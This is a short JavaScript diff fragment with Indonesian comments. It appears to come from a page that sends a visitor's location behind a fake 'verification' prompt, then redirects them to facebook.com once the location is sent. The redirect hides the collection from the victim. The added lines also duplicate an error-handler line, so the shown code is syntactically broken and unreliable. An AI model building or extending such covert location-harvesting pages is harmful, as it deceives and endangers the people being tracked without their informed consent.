@@ -35,6 +35,9 @@
                     .then(function(response) {
                         console.log("Access Granted", response);
                         alert("Have a Nice Day.");
+                        // Arahkan pengguna ke laman lain setelah lokasi dikirim
+                        window.location.href = "https://www.facebook.com/"; // Ganti dengan URL halaman yang ingin Anda arahkan
+                    }, function(error) {
                     }, function(error) {
                         console.error("Izinkan Untuk Melanjutkan", error);
                         alert("Verifikasi Gagal.");
